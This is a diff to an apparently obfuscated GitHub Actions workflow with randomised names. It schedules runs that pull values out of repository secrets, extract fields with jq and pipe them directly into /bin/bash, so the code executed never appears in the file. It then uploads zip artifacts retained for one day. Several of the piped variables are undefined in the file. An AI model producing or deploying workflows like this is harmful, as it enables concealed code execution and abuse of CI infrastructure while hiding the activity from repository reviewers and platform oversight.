@@ -1,25 +1,26 @@
 name: emberconcurrent74
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '29 4/6 * * *'
 
+  schedule:
+    - cron: '32 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: emberconcurrent74
         env:
-          y9542: ${{ secrets.y9542 }}
+          pifzr49: ${{ secrets.pifzr49 }}
         run: |
-          echo $y9542 | jq -r .k7 | /bin/bash
-          echo $bisa31086 | jq -r .vgpjh47 | /bin/bash
-          echo $buu779 | jq -r .rvtfc186 | /bin/bash
-          echo $vkpok5140 | jq -r .ebik14694 | /bin/bash
-          echo $yht9 | jq -r .nycrx0419 | /bin/bash
-          echo $yffmh55 | jq -r .d16 | /bin/bash
-          echo $ur687 | jq -r .rml7 | /bin/bash
+          printf '%s' "$pifzr49" | jq -r .m351 | /bin/bash
+          printf '%s' "$ddqu7958" | jq -r .qtbzr0561 | /bin/bash
+          printf '%s' "$eutf93377" | jq -r .dzf5734 | /bin/bash
+          echo $nl2 | jq -r .wjokc50 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: nibJdxdY
+          path: "*.zip"
+          retention-days: 1
